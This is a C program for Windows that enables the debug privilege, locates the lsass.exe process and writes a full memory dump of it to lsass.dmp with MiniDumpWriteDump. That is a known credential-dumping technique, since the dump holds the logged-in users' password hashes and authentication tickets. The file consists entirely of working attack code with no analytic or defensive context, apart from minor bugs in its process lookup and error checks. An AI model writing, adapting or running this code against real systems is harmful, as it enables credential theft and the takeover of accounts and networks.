#include <tchar.h>
#include <windows.h>
#include <dbghelp.h>
#include <tlhelp32.h>
#include <stdio.h>

BOOL set_debug_token() {
	HANDLE hToken;
	TOKEN_PRIVILEGES token_privileges;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        if (LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &token_privileges.Privileges[0].Luid)) {
            token_privileges.PrivilegeCount = 1;
            token_privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            if (AdjustTokenPrivileges(hToken, 0, &token_privileges, sizeof(token_privileges), NULL, NULL)) {
                CloseHandle(hToken);
                return TRUE;
            }
        }
        CloseHandle(hToken);
    }
	return FALSE;
}

DWORD get_lsass_pid() {
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 processEntry = {};
	processEntry.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(snapshot, &processEntry)) {
		while (Process32Next(snapshot, &processEntry)) {
            if (strcmp(processEntry.szExeFile, "lsass.exe") == 0) {
                return processEntry.th32ProcessID;
            }
		}
	}
}

int main(int argc, char *argv[]) {

    if (set_debug_token()) {
        DWORD lsassPid = get_lsass_pid();
        printf("Found lsass PID: %lu\n", lsassPid);
        HANDLE lsassHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 0, lsassPid);
        if (! lsassHandle) {
            printf("Err 0: %lu\n", GetLastError());
            return 0;
        }
        HANDLE hFile = CreateFileA("lsass.dmp", GENERIC_ALL, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
        if (!hFile) {
            printf("Err 1: %lu\n", GetLastError());
            return 0;
        } else {
            if (MiniDumpWriteDump(lsassHandle, lsassPid, hFile, MiniDumpWithFullMemory, 0, 0, 0 )) {
                printf("[+] Memory Dumped\n");
                CloseHandle(hFile);
            } else {
                printf("Err 2: %lu\n", GetLastError());
                return 0;
            }
        }
    }
    return 1;
}
